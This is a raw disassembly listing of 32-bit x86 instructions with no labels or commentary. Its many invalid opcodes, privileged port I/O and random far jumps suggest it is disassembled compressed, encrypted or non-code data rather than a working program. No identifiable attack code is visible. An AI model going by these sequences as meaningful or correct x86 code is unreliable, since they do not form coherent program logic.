  41a464:	out    0x86,al
  41a466:	popa   
  41a467:	enter  0x6f6c,0x6a
  41a46b:	nop
  41a46c:	xor    ah,bl
  41a46e:	push   0x2176a414
  41a473:	adc    al,BYTE PTR [esi]
  41a475:	ins    BYTE PTR es:[edi],dx
  41a476:	or     al,0xfa
  41a478:	mov    ebx,0x960a7047
  41a47d:	addr16 dec esi
  41a47f:	sub    bl,0xde
  41a482:	dec    ecx
  41a483:	pop    es
  41a484:	leave  
  41a485:	cmp    eax,0xa420d0a7
  41a48a:	dec    esi
  41a48b:	mov    ds:0xa7b57433,al
  41a490:	mov    ecx,?
  41a492:	add    al,0x50
  41a494:	jp     0x41a4b9
  41a496:	xlat   BYTE PTR ds:[ebx]
  41a497:	call   0x96063e19
  41a49c:	push   ebp
  41a49d:	xor    edx,edi
  41a49f:	cmp    DWORD PTR [ebx+eax*8-0x30],eax
  41a4a3:	pop    esp
  41a4a4:	mov    edi,ebx
  41a4a6:	ss mov esp,0x13666b22
  41a4ac:	das    
  41a4ad:	sbb    eax,0x7acbeb09
  41a4b2:	cmp    DWORD PTR [eax],esi
  41a4b4:	aaa    
  41a4b5:	cli    
  41a4b6:	pop    esi
  41a4b7:	mov    ecx,0x93cb911
  41a4bc:	into   
  41a4bd:	push   ecx
  41a4be:	rcr    DWORD PTR [ebp-0x63],1
  41a4c1:	je     0x41a521
  41a4c3:	dec    esp
  41a4c4:	inc    ecx
  41a4c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4c6:	mov    dh,0x54
  41a4c8:	xchg   BYTE PTR [ebx+0x57],ah
  41a4cb:	xchg   esi,eax
  41a4cc:	jl     0x41a4fd
  41a4ce:	sbb    al,0x4c
  41a4d0:	arpl   cx,bx
  41a4d2:	adc    ebx,ebp
  41a4d4:	loop   0x41a4a4
  41a4d6:	nop
  41a4d7:	add    DWORD PTR [esi-0xa3bdb95],edx
  41a4dd:	lock sub al,0xbf
  41a4e0:	lea    eax,[eax]
  41a4e2:	push   0xffffff8f
  41a4e4:	pop    ss
  41a4e5:	out    dx,al
  41a4e6:	jg     0x41a53f
  41a4e8:	mul    DWORD PTR [edi]
  41a4ea:	mov    ecx,0xaf44d6ce
  41a4ef:	pop    ebx
  41a4f0:	mov    dh,0x4e
  41a4f2:	stos   DWORD PTR es:[edi],eax
  41a4f3:	ins    DWORD PTR es:[edi],dx
  41a4f4:	icebp  
  41a4f5:	in     al,0xad
  41a4f7:	lahf   
  41a4f8:	or     esi,DWORD PTR [eax]
  41a4fa:	xchg   ebp,eax
  41a4fb:	mov    esi,0xaa4af16
  41a500:	pop    ebp
  41a501:	repz imul edx,DWORD PTR [ebp+0xaac78f6],0x2a15eafa
  41a50c:	xor    dl,BYTE PTR [edx+0x21]
  41a50f:	aaa    
  41a510:	mov    eax,ds:0xc3344a7a
  41a515:	xchg   ebx,eax
  41a516:	push   cs
  41a517:	dec    ebp
  41a518:	adc    DWORD PTR [eax],edi
  41a51a:	inc    ecx
  41a51b:	imul   ecx,edi,0x2bfaf254
  41a521:	imul   ecx,DWORD PTR [esi-0x7e6d6c6f],0x471825f7
  41a52b:	outs   dx,DWORD PTR ds:[esi]
  41a52c:	sbb    DWORD PTR [edi-0x2370ed8f],0xffffff8b
  41a533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a534:	adc    bl,BYTE PTR ds:0xe53697a6
  41a53a:	jo     0x41a4fc
  41a53c:	push   edi
  41a53d:	gs aam 0x23
  41a540:	mov    ah,0x9
  41a542:	fsub   QWORD PTR es:[ebp+0x71]
  41a546:	jge    0x41a56b
  41a548:	jnp    0x41a578
  41a54a:	sbb    eax,0x3cd6a27a
  41a54f:	mov    ds:0xef329857,al
  41a554:	jmp    0xf105:0x7e5abb07
  41a55b:	test   BYTE PTR [eax+0x59],dl
  41a55e:	pop    eax
  41a55f:	jle    0x41a59c
  41a561:	sub    al,0xe7
  41a563:	les    ebp,FWORD PTR [ebx-0x33]
  41a566:	pop    ds
  41a567:	(bad)  
  41a568:	(bad)  
  41a569:	jb     0x41a53c
  41a56b:	and    eax,0x339f2a3a
  41a570:	ret    
  41a571:	and    BYTE PTR [esi-0x54],cl
  41a574:	cmp    edi,eax
  41a576:	sti    
  41a577:	push   cs
  41a578:	ins    BYTE PTR es:[edi],dx
  41a579:	adc    ebp,DWORD PTR [esi]
  41a57b:	and    BYTE PTR [edx-0x52fc3038],bl
  41a581:	clc    
  41a582:	add    edx,DWORD PTR [eax-0x3a8ccbfe]
  41a588:	jmp    0x41a51e
  41a58a:	jg     0x41a5a3
  41a58c:	cwde   
  41a58d:	jmp    0x517487c5
  41a592:	out    dx,eax
  41a593:	cmp    BYTE PTR [esi+0x4e],dh
  41a596:	aas    
  41a597:	push   ss
  41a598:	push   edi
  41a599:	in     al,0x64
  41a59b:	enter  0x5974,0x14
  41a59f:	jo     0x41a55b
  41a5a1:	push   cs
  41a5a2:	xchg   BYTE PTR [ecx],bh
  41a5a4:	dec    ebp
  41a5a5:	inc    eax
  41a5a6:	out    dx,al
  41a5a7:	add    eax,0x757cea80
  41a5ac:	repz add eax,0x314b34c
  41a5b2:	xor    ecx,edx
  41a5b4:	hlt    
  41a5b5:	jns    0x41a5ba
  41a5b7:	cwde   
  41a5b8:	cmp    DWORD PTR [ecx-0x60],edx
  41a5bb:	adc    al,0xf2
  41a5bd:	xor    eax,0x8398ff88
  41a5c2:	jno    0x41a5ec
  41a5c4:	xor    BYTE PTR [eax-0x65],dl
  41a5c7:	sar    DWORD PTR [ebx+0x43],cl
  41a5ca:	test   al,0xe3
  41a5cc:	fsubr  st,st(3)
  41a5ce:	sub    al,0xeb
  41a5d0:	xlat   BYTE PTR ds:[ebx]
  41a5d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5d2:	sub    BYTE PTR [edi+0x38],dh
  41a5d5:	loop   0x41a5f3
  41a5d7:	inc    ebx
  41a5d8:	jno    0x41a5a9
  41a5da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5db:	dec    edi
  41a5dc:	add    DWORD PTR [edi],ecx
  41a5de:	sbb    ebx,DWORD PTR [ecx+0x27]
  41a5e1:	out    0x7d,al
  41a5e3:	pushf  
  41a5e4:	hlt    
  41a5e5:	sti    
  41a5e6:	xor    BYTE PTR [ecx+0x2549af9c],dh
  41a5ec:	add    al,0x5d
  41a5ee:	and    edx,eax
  41a5f0:	xchg   esi,eax
  41a5f1:	pop    ecx
  41a5f2:	mov    ah,0x3b
  41a5f4:	cmp    dh,BYTE PTR [esi]
  41a5f6:	arpl   dx,ax
  41a5f8:	and    DWORD PTR [esi+edx*1+0x36],esi
  41a5fc:	lock bnd jbe 0x41a646
  41a600:	fisttp WORD PTR [esp+ebp*8]
  41a603:	arpl   WORD PTR [esi+ecx*1-0x7ec8ceb4],si
  41a60a:	je     0x41a5bd
  41a60c:	call   DWORD PTR [edi-0x72]
  41a60f:	add    eax,DWORD PTR [eax+edx*1+0x382f3427]
  41a616:	adc    BYTE PTR [edi+edi*2+0x34aa370d],cl
  41a61d:	dec    edx
  41a61e:	pusha  
  41a61f:	arpl   WORD PTR [ebx+esi*2-0x19fd7dd8],si
  41a626:	adc    ebx,0x7a22f9ff
  41a62c:	retf   0xf0c6
  41a62f:	adc    ebx,DWORD PTR [edi]
  41a631:	push   eax
  41a632:	jo     0x41a5bc
  41a634:	jns    0x41a6ac
  41a636:	mov    ds:0xcc9c9443,al
  41a63b:	sbb    eax,0x68cc5f93
  41a640:	jns    0x41a6a3
  41a642:	idiv   BYTE PTR [edi]
  41a644:	pop    esi
  41a645:	and    eax,0x5ec8ca51
  41a64a:	add    ch,BYTE PTR es:[ebp+0x871af8]
  41a651:	pop    di
  41a653:	or     al,0xd8
  41a655:	stos   DWORD PTR es:[edi],eax
  41a656:	jo     0x41a627
  41a658:	sbb    DWORD PTR ds:0xb6c3320b,esp
  41a65e:	lods   al,BYTE PTR ds:[esi]
  41a65f:	imul   esp,DWORD PTR [eax+edx*8-0x5f24996f],0xffffffd6
  41a667:	inc    ecx
  41a668:	xor    DWORD PTR [ebp+0x15b52e],0x53
  41a66f:	mov    dh,0x15
  41a671:	loop   0x41a5fd
  41a673:	(bad)  
  41a674:	lods   al,BYTE PTR ds:[esi]
  41a675:	jle    0x41a660
  41a677:	or     dh,BYTE PTR [edx]
  41a679:	add    al,0x92
  41a67b:	xchg   ebp,eax
  41a67c:	stc    
  41a67d:	add    al,0x65
  41a67f:	jbe    0x41a6d4
  41a681:	cld    
  41a682:	cmp    DWORD PTR [ecx+0x5f0d0249],edi
  41a688:	mov    bl,0xbe
  41a68a:	imul   eax,ebx,0x33
  41a68d:	retf   0xb291
  41a690:	stos   BYTE PTR es:[edi],al
  41a691:	pop    esi
  41a692:	cmp    DWORD PTR [esi-0x6c77bfd4],ebx
  41a698:	jb     0x41a649
  41a69a:	pop    ebp
  41a69b:	xrelease mov DWORD PTR [eax-0x2071cda6],0x108c0d46
  41a6a6:	xor    bl,BYTE PTR [ecx+ebp*1+0x6b]
  41a6aa:	jbe    0x41a6e9
  41a6ac:	push   cs
  41a6ad:	mov    dl,0x2f
  41a6af:	inc    ebx
  41a6b0:	dec    ebp
  41a6b1:	pop    edi
  41a6b2:	pop    edx
  41a6b3:	xchg   BYTE PTR [esi+ecx*2],bl
  41a6b6:	inc    ch
  41a6b8:	icebp  
  41a6b9:	mov    al,ds:0x8e896ea6
  41a6be:	rol    BYTE PTR ds:0xaccf5bc0,1
  41a6c4:	jnp    0x41a6a7
  41a6c6:	sbb    al,0x81
  41a6c8:	bound  eax,QWORD PTR [esi]
  41a6ca:	xor    dh,BYTE PTR [eax+0x29f136cb]
  41a6d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6d1:	addr16 lock je 0x41a65c
  41a6d5:	cmp    eax,0xec991f78
  41a6da:	lock iret 
  41a6dc:	stc    
  41a6dd:	sub    al,0x41
  41a6df:	inc    ebp
  41a6e0:	or     eax,DWORD PTR [edi]
  41a6e2:	je     0x41a714
  41a6e4:	idiv   BYTE PTR [edx]
  41a6e6:	cmp    dh,ah
  41a6e8:	das    
  41a6e9:	js     0x41a704
  41a6eb:	or     esp,edi
  41a6ed:	fdiv   QWORD PTR [edx+ecx*2-0x7b6c3a15]
  41a6f4:	inc    eax
  41a6f5:	sub    bh,bl
  41a6f7:	ss in  al,dx
  41a6f9:	add    DWORD PTR ds:0xaf67d675,esi
  41a6ff:	add    eax,0x4d191e7d
  41a704:	jbe    0x41a6ff
  41a706:	shl    edi,cl
  41a708:	cmp    esp,DWORD PTR [eax+0x17]
  41a70b:	pop    ebp
  41a70c:	inc    esp
  41a70d:	and    eax,0x69c55962
  41a712:	jl     0x41a705
  41a714:	inc    ecx
  41a715:	add    eax,0x88139841
  41a71a:	icebp  
  41a71b:	jne    0x41a6dc
  41a71d:	or     dh,ch
  41a71f:	int3   
  41a720:	inc    edi
  41a721:	fiadd  WORD PTR [edx-0x77]
  41a724:	adc    eax,0xdcac7c96
  41a729:	sbb    ebp,DWORD PTR [esi+0x29]
  41a72c:	sub    ebx,DWORD PTR [ecx+0x47]
  41a72f:	mov    ds:0xcb156963,eax
  41a734:	in     eax,dx
  41a735:	inc    ecx
  41a736:	ret    0x2ef1
  41a739:	push   esi
  41a73a:	sbb    eax,0x4ba6bd47
  41a73f:	mov    ah,0x1a
  41a741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a742:	repz int 0x7d
  41a745:	jae    0x41a796
  41a747:	inc    ecx
  41a748:	jmp    0x2168ff02
  41a74d:	jae    0x41a6d1
  41a74f:	leave  
  41a750:	mov    ecx,0xcf4654e4
  41a755:	cmp    BYTE PTR [ebx],bl
  41a757:	lds    ecx,FWORD PTR [ecx-0x14]
  41a75a:	mov    ah,0x46
  41a75c:	shr    BYTE PTR [ecx+0x36],cl
  41a75f:	and    bl,dh
  41a761:	jbe    0x41a701
  41a763:	mov    eax,edi
  41a765:	push   esp
  41a766:	jle    0x41a7bc
  41a768:	lock push edx
  41a76a:	aas    
  41a76b:	es push ecx
  41a76d:	test   eax,0xbc0d197a
  41a772:	or     eax,0xecf6b4d9
  41a777:	add    edi,DWORD PTR [eax+ecx*4+0x7]
  41a77b:	fst    DWORD PTR [ebp-0x4c618cf]
  41a781:	stos   BYTE PTR es:[edi],al
  41a782:	bound  edi,QWORD PTR [eax]
  41a784:	add    BYTE PTR [ebp*2+0x74792143],0x2
  41a78c:	add    eax,0x9ee7030
  41a791:	int    0x3e
  41a793:	dec    ebx
  41a794:	pop    ss
  41a795:	xor    eax,0xaed03385
  41a79a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a79b:	js     0x41a79a
  41a79d:	sbb    eax,0x8f217602
  41a7a2:	jno    0x41a7e6
  41a7a4:	mov    eax,ds:0x722487bd
  41a7a9:	xor    ch,BYTE PTR [edi+0x6d]
  41a7ac:	inc    ebx
  41a7ad:	push   ecx
  41a7ae:	pop    ebx
  41a7af:	iret   
  41a7b0:	int3   
  41a7b1:	test   eax,0x21b14560
  41a7b6:	mov    ebx,0xadfeb5af
  41a7bb:	loop   0x41a768
  41a7bd:	or     DWORD PTR [edi],edi
  41a7bf:	xor    dl,BYTE PTR [edi-0x11]
  41a7c2:	ds add ebp,eax
  41a7c5:	scas   al,BYTE PTR es:[edi]
  41a7c6:	nop
  41a7c7:	pop    es
  41a7c8:	mov    eax,0x3af63737
  41a7cd:	aas    
  41a7ce:	stc    
  41a7cf:	dec    edi
  41a7d0:	out    dx,eax
  41a7d1:	scas   al,BYTE PTR es:[edi]
  41a7d2:	dec    ecx
  41a7d3:	inc    ebp
  41a7d4:	rol    dh,0xc4
  41a7d7:	dec    esp
  41a7d8:	xor    esp,DWORD PTR ds:0xa90407e2
  41a7de:	ror    ah,cl
  41a7e0:	add    esi,DWORD PTR [esp+edi*1-0x6a]
  41a7e4:	sub    bl,ah
  41a7e6:	inc    ebp
  41a7e7:	ja     0x41a7b9
  41a7e9:	int3   
  41a7ea:	daa    
  41a7eb:	push   es
  41a7ec:	mov    ds:0xf80b5143,al
  41a7f1:	pop    edi
  41a7f2:	(bad)  [ebx+ebp*4]
  41a7f5:	aas    
  41a7f6:	mov    ah,cl
  41a7f8:	cmp    al,0x19
  41a7fa:	retf   
  41a7fb:	pop    ebx
  41a7fc:	push   esp
  41a7fd:	prefetch BYTE PTR [esi]
  41a800:	mov    fs:0x18f00204,al
  41a806:	or     eax,0x1fc125e3
  41a80b:	jbe    0x41a7d8
  41a80d:	push   ds
  41a80e:	mov    dl,0xad
  41a810:	in     eax,dx
  41a811:	loopne 0x41a7a1
  41a813:	push   esp
  41a814:	aas    
  41a815:	jne    0x41a860
  41a817:	sbb    eax,0xe9e10b28
  41a81c:	ret    
  41a81d:	jne    0x41a7bd
  41a81f:	js     0x41a867
  41a821:	xchg   ebp,eax
  41a822:	sub    al,0x65
  41a824:	jae    0x41a82d
  41a826:	push   esi
  41a827:	and    eax,0x6e55608a
  41a82c:	mov    bl,BYTE PTR [ecx+ebx*1-0x7fd66ffe]
  41a833:	mov    bl,0xa9
  41a835:	xor    ch,ch
  41a837:	cwde   
  41a838:	xor    eax,0xf5e7ba05
  41a83d:	and    BYTE PTR [ebp+0x53],ah
  41a840:	(bad)  
  41a841:	push   esp
  41a842:	out    dx,eax
  41a843:	lea    ebp,[edi+esi*8-0x59c6a086]
  41a84a:	sub    DWORD PTR [esi-0x4815b199],edi
  41a850:	aam    0xbe
  41a852:	and    al,0xf2
  41a854:	xchg   esp,eax
  41a855:	daa    
  41a856:	pop    ebp
  41a857:	jmp    0xf039811d
  41a85c:	pop    ebx
  41a85d:	mov    eax,ds:0xe8d152c4
  41a862:	push   edi
  41a863:	push   edx
  41a864:	fcom   DWORD PTR [ebp+edx*4-0x29eab4ed]
  41a86b:	repnz mov ch,BYTE PTR [edx-0x2dc94730]
  41a872:	mov    dl,0x47
  41a874:	and    DWORD PTR ds:0x73af1435,ecx
  41a87a:	out    dx,al
  41a87b:	stos   DWORD PTR es:[edi],eax
  41a87c:	mov    ebp,0xe5b54170
  41a881:	setbe  dh
  41a884:	ret    0x86d1
  41a887:	pop    ebx
  41a888:	xor    al,0x72
  41a88a:	(bad)  
  41a88b:	fimul  WORD PTR [eax+0x5bbba273]
  41a891:	mov    esi,DWORD PTR ds:0x70d66af2
  41a897:	jne    0x41a81b
  41a899:	sub    al,0x51
  41a89b:	adc    al,0x89
  41a89d:	xchg   esi,eax
  41a89e:	push   0x5e6343d5
  41a8a3:	pop    eax
  41a8a4:	inc    edx
  41a8a5:	add    al,0x59
  41a8a7:	jo     0x41a910
  41a8a9:	in     eax,0x8c
  41a8ab:	test   DWORD PTR [ebp+0x68],ebx
  41a8ae:	into   
  41a8af:	xor    edx,DWORD PTR [ecx-0x1a611d69]
  41a8b5:	mov    edi,0x5caeacd1
  41a8ba:	scas   al,BYTE PTR es:[edi]
  41a8bb:	jnp    0x41a87c
  41a8bd:	test   ah,ch
  41a8bf:	mov    esi,0x3b9cd5dc
  41a8c4:	fnsave ds:0x6b733ba3
  41a8ca:	fist   WORD PTR [edx]
  41a8cc:	(bad)  
  41a8ce:	xchg   esp,eax
  41a8cf:	or     ecx,esi
  41a8d1:	add    ebx,DWORD PTR [esi-0x61]
  41a8d4:	jns    0x41a85c
  41a8d6:	call   0x4775b5c5
  41a8db:	mov    eax,DWORD PTR [ecx-0x70]
  41a8de:	aad    0x53
  41a8e0:	sbb    eax,DWORD PTR [edi-0x2742c0ea]
  41a8e6:	loopne 0x41a917
  41a8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8e9:	jg     0x41a90a
  41a8eb:	inc    eax
  41a8ec:	jle    0x41a88b
  41a8ee:	imul   ebx,DWORD PTR [esi],0xc21f5f06
  41a8f4:	xchg   esi,eax
  41a8f5:	xchg   ebx,eax
  41a8f6:	jmp    0x33ec:0x536b6d07
  41a8fd:	call   0x5e54:0x16aa14d2
  41a904:	xchg   ecx,eax
  41a905:	adc    al,BYTE PTR [ebx+0x33]
  41a908:	sub    eax,DWORD PTR [esi]
  41a90a:	test   eax,0x9bc19080
  41a90f:	and    DWORD PTR [esi],edi
  41a911:	sti    
  41a912:	inc    edx
  41a913:	cmp    al,0xb3
  41a915:	xor    al,ch
  41a917:	test   al,0xaa
  41a91a:	sar    bh,cl
  41a91c:	inc    ebx
  41a91d:	popf   
  41a91e:	gs mov ecx,0x775ced55
  41a924:	sub    al,0x49
  41a926:	sahf   
  41a927:	inc    esi
  41a928:	shr    DWORD PTR [ebx+0x6e142f50],1
  41a92e:	push   es
  41a92f:	xchg   BYTE PTR [eax+0x1169ac4d],ch
  41a935:	shl    BYTE PTR [eax-0xe],cl
  41a938:	mov    eax,0xe184c328
  41a93d:	es addr16 jmp 0xc300:0x5d4ba53
  41a946:	int3   
  41a947:	mov    cl,0x96
  41a949:	add    esp,eax
  41a94b:	call   0x1232:0xff1c7035
  41a952:	dec    edx
  41a953:	cmp    bh,cl
  41a955:	jecxz  0x41a974
  41a957:	fwait
  41a958:	mov    ss,ecx
  41a95a:	fcomp  QWORD PTR [esi-0x7]
  41a95d:	push   es
  41a95e:	sahf   
  41a95f:	and    DWORD PTR [esp+ebp*4],edi
  41a962:	inc    edi
  41a963:	jns    0x41a956
  41a965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a966:	mov    al,0xfa
  41a968:	iret   
  41a969:	int    0xba
  41a96b:	stc    
  41a96c:	and    esi,esp
  41a96e:	pushf  
  41a96f:	mov    ebp,ss
  41a971:	out    0x1,eax
  41a973:	ror    BYTE PTR [esi+ebp*8],0x60
  41a977:	mov    dh,0xee
  41a979:	sbb    eax,0xd5311c89
  41a97e:	and    DWORD PTR [ebp-0x56],edx
  41a981:	mov    DWORD PTR [ecx+0x33],eax
  41a984:	xor    BYTE PTR [edx-0x64406ec4],dl
  41a98a:	xor    BYTE PTR [esi+edi*4+0x1a9d1615],bh
  41a991:	je     0x41a97e
  41a993:	adc    bh,0x91
  41a996:	cli    
  41a997:	cwde   
  41a998:	aaa    
  41a999:	adc    DWORD PTR [edi+0x46d83021],edi
  41a99f:	and    ebx,DWORD PTR [edx+0x37]
  41a9a2:	mov    ch,0x60
  41a9a4:	push   0x47
  41a9a6:	or     edi,DWORD PTR [ecx+0x235654ae]
  41a9ac:	test   BYTE PTR [esi+edx*1],al
  41a9af:	mov    ds:0x2bf4130e,al
  41a9b4:	or     cl,BYTE PTR [ebx]
  41a9b6:	mov    ebp,0x11bc2810
  41a9bb:	add    al,0xcb
  41a9bd:	jo     0x41a986
  41a9bf:	(bad)  
  41a9c0:	retf   
  41a9c1:	cmc    
  41a9c2:	and    cl,BYTE PTR [ecx-0x17bc7308]
  41a9c8:	imul   esp,DWORD PTR [eax+0x7973244d],0xffffffd5
  41a9cf:	pop    ebp
  41a9d0:	and    dh,BYTE PTR [edx+esi*4]
  41a9d3:	fsubr  DWORD PTR [esi]
  41a9d5:	push   eax
  41a9d6:	pop    esp
  41a9d7:	fdiv   DWORD PTR [eax]
  41a9d9:	mov    ebp,0x6aad0ae1
  41a9de:	in     eax,dx
  41a9df:	leave  
  41a9e0:	mov    cl,0x60
  41a9e2:	jns    0x41a9f7
  41a9e4:	push   0xfffffff5
  41a9e6:	and    dl,BYTE PTR [edi+0x15]
  41a9e9:	mov    al,0xe3
  41a9eb:	gs jge 0x41a9a7
  41a9ee:	cmc    
  41a9ef:	call   0x63cf82d4
  41a9f4:	add    eax,0x2ac07036
  41a9f9:	pop    ebx
  41a9fa:	shr    DWORD PTR [eax],1
  41a9fc:	jne    0x41a9f5
  41a9fe:	push   0xfa17395
  41aa03:	les    ecx,FWORD PTR [ebp+0x5e]
  41aa06:	push   eax
  41aa07:	adc    ebx,esp
  41aa09:	or     BYTE PTR gs:[ebp+0x6a9b25f7],dl
  41aa10:	in     eax,dx
  41aa11:	cs fs arpl dx,ax
  41aa15:	(bad)  
  41aa16:	mov    dh,0x23
  41aa18:	add    eax,0xcb0ac95
  41aa1d:	inc    ecx
  41aa1e:	lods   al,BYTE PTR ds:[esi]
  41aa1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa20:	and    BYTE PTR [edx-0x38],bl
  41aa23:	dec    eax
  41aa24:	ret    0x702c
  41aa27:	or     eax,DWORD PTR [eax+0x39f3b8d5]
  41aa2d:	cmp    DWORD PTR [ebp-0x52647a38],esp
  41aa33:	push   edx
  41aa34:	inc    ebp
  41aa35:	adc    ch,BYTE PTR ds:0xc3c23d7f
  41aa3b:	sub    al,0xf9
  41aa3d:	push   eax
  41aa3e:	fst    st(4)
  41aa40:	aad    0xd4
  41aa42:	nop
  41aa43:	lods   al,BYTE PTR ds:[esi]
  41aa44:	sub    BYTE PTR [esi-0x26021d26],bh
  41aa4a:	pop    ss
  41aa4b:	aas    
  41aa4c:	pop    ebx
  41aa4d:	or     DWORD PTR [ecx-0x21f55b8d],esi
  41aa53:	cmp    dl,BYTE PTR [eax]
  41aa55:	scas   al,BYTE PTR es:[edi]
  41aa56:	test   esp,esi
  41aa58:	dec    edi
  41aa59:	and    bh,BYTE PTR [eax+0x45709d43]
  41aa5f:	fsubr  QWORD PTR [ecx+edx*8]
  41aa62:	pop    ebp
  41aa63:	out    dx,eax
  41aa64:	lea    edx,[ecx-0x59]
  41aa67:	lea    ecx,[edi+ebp*2+0x7c590bb2]
  41aa6e:	into   
  41aa6f:	out    0x90,al
  41aa71:	push   esi
  41aa72:	test   BYTE PTR gs:[ebp-0x26178498],cl
  41aa79:	jl     0x41aacb
  41aa7b:	jg     0x41aac2
  41aa7d:	stos   DWORD PTR es:[edi],eax
  41aa7e:	pop    esi
  41aa7f:	jae    0x41aa90
  41aa81:	popa   
  41aa82:	es inc edx
  41aa84:	push   esp
  41aa85:	jmp    0x40159410
  41aa8a:	and    ecx,DWORD PTR [ebx-0x1f9bbee4]
  41aa90:	(bad)  
  41aa91:	mov    esi,0xc0b98442
  41aa96:	fist   DWORD PTR [edx-0x43]
  41aa99:	sbb    ecx,DWORD PTR [edi-0x34]
  41aa9c:	jl     0x41aa97
  41aa9e:	ret    0x503d
  41aaa1:	cdq    
  41aaa2:	cmp    ah,BYTE PTR [ebx-0x16d9b405]
  41aaa8:	stos   BYTE PTR es:[edi],al
  41aaa9:	iret   
  41aaaa:	retf   0x1f63
  41aaad:	fdiv   st(4),st
  41aaaf:	inc    esp
  41aab0:	mov    dl,0xd6
  41aab2:	push   0xffffffa8
  41aab4:	xchg   edx,eax
  41aab5:	out    0xf5,al
  41aab7:	les    eax,FWORD PTR [edi]
  41aab9:	bound  esi,QWORD PTR ds:0xbf8b63b7
  41aabf:	add    al,0xb8
  41aac1:	(bad)  
  41aac2:	rep outs dx,BYTE PTR ds:[esi]
  41aac4:	mov    ds:0xcf439135,eax
  41aac9:	fwait
  41aaca:	push   es
  41aacb:	add    DWORD PTR [edi],eax
  41aacd:	icebp  
  41aace:	mov    bl,0x6e
  41aad0:	jae    0x41ab34
  41aad2:	mov    cl,0xe8
  41aad4:	lods   al,BYTE PTR cs:[esi]
  41aad6:	lahf   
  41aad7:	mov    dh,0x65
  41aad9:	jbe    0x41aa7e
  41aadb:	mov    al,ds:0x8a76962e
  41aae0:	bound  eax,QWORD PTR [ebx]
  41aae2:	add    ch,cl
  41aae4:	rcl    DWORD PTR [eax],cl
  41aae6:	scas   eax,DWORD PTR es:[edi]
  41aae7:	repz sub BYTE PTR [ebp+0x7f0d7afa],ah
  41aaee:	xchg   ebx,eax
  41aaef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaf0:	mov    ah,0x40
  41aaf2:	popf   
  41aaf3:	mov    ch,0x63
  41aaf5:	(bad)
  41aaf9:	leave  
  41aafa:	out    0xad,eax
  41aafc:	fcom   QWORD PTR [ebx-0x3ff20c98]
  41ab02:	aad    0x59
  41ab04:	sbb    al,0xd2
  41ab06:	push   0x4e
  41ab08:	mov    ds:0x9a30c8ec,al
  41ab0d:	out    dx,al
  41ab0e:	dec    edx
  41ab0f:	add    cl,BYTE PTR [edx+0x4c78dc78]
  41ab15:	ffree  st(2)
  41ab17:	dec    esi
  41ab18:	(bad)
  41ab1b:	and    ebx,DWORD PTR [ebx+edi*4+0x25]
  41ab1f:	adc    al,0xdb
  41ab21:	adc    ebp,eax
  41ab23:	xchg   ecx,eax
  41ab24:	dec    edx
  41ab25:	fld    QWORD PTR [ebx-0x76bc779]
  41ab2b:	loop   0x41aabc
  41ab2d:	and    BYTE PTR [esp+edi*4-0x16df04ed],dh
  41ab34:	cs xor al,0x77
  41ab37:	xor    eax,0x271eeb23
  41ab3c:	jnp    0x41ab69
  41ab3e:	stos   BYTE PTR es:[edi],al
  41ab3f:	jae    0x41ab1b
  41ab41:	sbb    DWORD PTR [ebx+0x2f],esi
  41ab44:	or     dl,BYTE PTR [ebp-0x3e]
  41ab47:	daa    
  41ab48:	mov    ecx,0x16aeb0ea
  41ab4d:	rcr    ebx,0x97
  41ab50:	imul   esp,DWORD PTR [ecx],0x13
  41ab53:	add    BYTE PTR [ecx-0x29],dl
  41ab56:	loope  0x41aada
  41ab58:	lahf   
  41ab59:	push   0xfffffffd
  41ab5b:	mov    WORD PTR [ebx+0x2214140],gs
  41ab61:	mov    edi,0x1575c462
  41ab66:	mov    esp,0x60f8c430
  41ab6b:	ins    BYTE PTR es:[edi],dx
  41ab6c:	dec    edi
  41ab6d:	mov    gs,ebx
  41ab6f:	jp     0x41aaf7
  41ab71:	xchg   ecx,eax
  41ab72:	outs   dx,DWORD PTR ds:[esi]
  41ab73:	mov    es,WORD PTR [ecx-0x4]
  41ab76:	ss arpl bp,sp
  41ab79:	aad    0x40
  41ab7b:	lods   al,BYTE PTR ds:[esi]
  41ab7c:	jge    0x41ab25
  41ab7e:	mov    ebx,0x74638ea0
  41ab83:	inc    ecx
  41ab84:	imul   esp,DWORD PTR [ecx+0xd],0x57e4433e
  41ab8b:	js     0x41abfd
  41ab8d:	scas   eax,DWORD PTR es:[edi]
  41ab8e:	outs   dx,BYTE PTR ds:[esi]
  41ab8f:	jmp    0x41ab58
  41ab91:	rcr    DWORD PTR [ebx+0x2f],cl
  41ab94:	or     dh,BYTE PTR [edi+0x73a3662f]
  41ab9a:	addr16 pop eax
  41ab9c:	adc    cl,0x52
  41ab9f:	lods   eax,DWORD PTR ds:[esi]
  41aba0:	aad    0x91
  41aba2:	xor    ecx,DWORD PTR [esi]
  41aba4:	mov    eax,0x562f41b
  41aba9:	adc    ch,BYTE PTR [eax-0x33]
  41abac:	in     al,0x80
  41abae:	jne    0x41abd6
  41abb0:	int3   
  41abb1:	or     edi,DWORD PTR [ebp+0x63]
  41abb4:	add    DWORD PTR [ecx],eax
  41abb6:	push   es
  41abb7:	adc    DWORD PTR [ebx-0xd],0x5da1c13
  41abbe:	in     eax,0x22
  41abc0:	scas   al,BYTE PTR es:[edi]
  41abc1:	dec    edx
  41abc2:	stos   DWORD PTR es:[edi],eax
  41abc3:	in     eax,0xca
  41abc5:	add    al,0x6e
  41abc7:	dec    esp
  41abc8:	(bad)  
  41abc9:	ins    DWORD PTR es:[edi],dx
  41abca:	xchg   ecx,eax
  41abcb:	xchg   ecx,eax
  41abcc:	mov    ah,0x12
  41abce:	(bad)  
  41abd0:	jecxz  0x41ac23
  41abd2:	pop    ebx
  41abd3:	mov    DWORD PTR [eax-0x60],0x9e0d0b80
  41abda:	arpl   WORD PTR [ebx-0x3f],di
  41abdd:	jo     0x41ab72
  41abdf:	dec    ebp
  41abe0:	int3   
  41abe1:	dec    eax
  41abe2:	js     0x41ab88
